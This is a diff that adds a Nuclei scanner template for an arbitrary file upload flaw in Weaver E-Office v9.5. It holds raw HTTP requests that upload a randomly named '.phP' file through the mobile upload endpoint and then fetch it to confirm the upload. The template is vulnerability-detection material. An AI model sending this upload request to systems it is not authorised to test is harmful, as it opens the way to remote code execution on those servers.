@@ -1,0 +1,65 @@
+id: weaver-eoffice-file-upload
+
+info:
+  name: Weaver E-Office v9.5 - Arbitrary File Upload
+  author: princechaddha
+  severity: high
+  description: |
+    Weaver E-Office version 9.5 is susceptible to an arbitrary file upload vulnerability. This flaw allows malicious actors to upload and execute arbitrary code or files without proper validation or authorization.
+  reference:
+    - https://github.com/RCEraser/cve/blob/main/Weaver.md
+  classification:
+    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="泛微-EOffice"
+    product: e-office
+    vendor: weaver
+  tags: e-office,weaver,intrusive,file-upload
+
+variables:
+  filename: '{{rand_base(7, "abc")}}'
+
+http:
+  - raw:
+      - |
+        POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="upload_quwan"; filename="{{filename}}.phP"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+      - |
+        GET /attachment/{{id}}/{{filename}}.phP HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+
+    extractors:
+      - type: regex
+        name: id
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - '\\\/attachment\\\/([0-9]+)\\\/'
+# digest: 490a0046304402204664c399cf5c9ce1e2ff14f977a5cc35a6de2970f19dc5ffbcd77567a47bbc45022067f301ea809152e81fdbc74fda9a288af2ea441f0c7ec523d708b196f88772e0:922c64590222798bb761d5b6d8e72950
